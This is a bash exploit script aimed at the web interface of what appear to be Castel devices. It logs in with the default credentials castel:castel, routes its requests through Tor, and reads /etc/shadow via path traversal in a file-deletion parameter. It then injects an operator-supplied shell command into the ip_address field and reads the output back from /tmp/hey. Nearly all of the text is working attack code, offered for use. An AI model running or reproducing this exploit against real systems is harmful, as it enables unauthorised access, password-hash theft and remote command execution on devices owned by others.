echo "---======================================= Castel Tricks =======================================---"
echo '''
  ::::::::: ::::::::::: ::::    :::  ::::::::       :::::::::   ::::::::  ::::    :::  ::::::::  
  :+:    :+:    :+:     :+:+:   :+: :+:    :+:      :+:    :+: :+:    :+: :+:+:   :+: :+:    :+: 
  +:+    +:+    +:+     :+:+:+  +:+ +:+             +:+    +:+ +:+    +:+ :+:+:+  +:+ +:+        
  +#+    +:+    +#+     +#+ +:+ +#+ :#:             +#+    +:+ +#+    +:+ +#+ +:+ +#+ :#:        
  +#+    +#+    +#+     +#+  +#+#+# +#+   +#+#      +#+    +#+ +#+    +#+ +#+  +#+#+# +#+   +#+# 
  #+#    #+#    #+#     #+#   #+#+# #+#    #+#      #+#    #+# #+#    #+# #+#   #+#+# #+#    #+# 
  ######### ########### ###    ####  ########       #########   ########  ###    ####  ########  
'''
echo "---==============================================================================================---"
echo "Login with default creds (castel:castel)"

cookie=$(torify curl -iskX POST "$1/cgi-bin/login.cgi?lang=fr" --data "lang=fr&mode=11&bt=21&login=castel&password=castel" | grep "Set-Cookie" | grep -o -P '(?<=Id=).*(?=;path)')
echo ""
echo "Cookie : SessId=$cookie"
if [[ $3 == "check" ]] ; then
echo ""
echo "Check Read File Vuln (/etc/shadow)"
echo ""
torify curl -iskX POST "$1/cgi-bin/webgip.cgi?lang=fr&affichage=2&gid=130816&page=12&onglet=2&step=0" --cookie "SessId=$cookie" --data "protocol=2&page=35&mode=21&lang=en&bt=45&gid=&fichier_a_envoyer_type=&fichier_a_telecharger_supprimer_type=8&fichier_a_envoyer_selection=&fichier_a_envoyer_nom=&fichier_a_telecharger_supprimer_audio=&fichier_a_telecharger_supprimer_image=&fichier_a_telecharger_supprimer_certificat=&fichier_a_telecharger_supprimer_mib=../../../../../etc/shadow&fichier_a_renommer_type=&fichier_a_renommer_audio=&fichier_a_renommer_image=&fichier_a_renommer_certificat=&fichier_a_renommer_mib=&fichier_nouveau_nom=&file_type=8&file_action=1&file_list=meh&file_name="
fi
echo ""
echo "Try to execute command and read output in /tmp/hey"
echo ""
torify curl -iskX POST "$1/cgi-bin/webgip.cgi?lang=fr&affichage=1&gid=130816&page=36" --cookie "SessId=$cookie" --data "
lang=fr&affichage=1&page=36&onglet=1&gid=130816&mode=11&bt=1&validity_delay=3650&generation_mode=0&ip_address=\$($2%20>/tmp/hey)&hostname=lel
" > /dev/null


torify curl -skX POST "$1/cgi-bin/webgip.cgi?lang=fr&affichage=2&gid=130816&page=12&onglet=2&step=0" --cookie "SessId=$cookie" --data "protocol=2&page=35&mode=21&lang=en&bt=45&gid=&fichier_a_envoyer_type=&fichier_a_telecharger_supprimer_type=8&fichier_a_envoyer_selection=&fichier_a_envoyer_nom=&fichier_a_telecharger_supprimer_audio=&fichier_a_telecharger_supprimer_image=&fichier_a_telecharger_supprimer_certificat=&fichier_a_telecharger_supprimer_mib=../../../../../tmp/hey&fichier_a_renommer_type=&fichier_a_renommer_audio=&fichier_a_renommer_image=&fichier_a_renommer_certificat=&fichier_a_renommer_mib=&fichier_nouveau_nom=&file_type=8&file_action=1&file_list=meh&file_name="
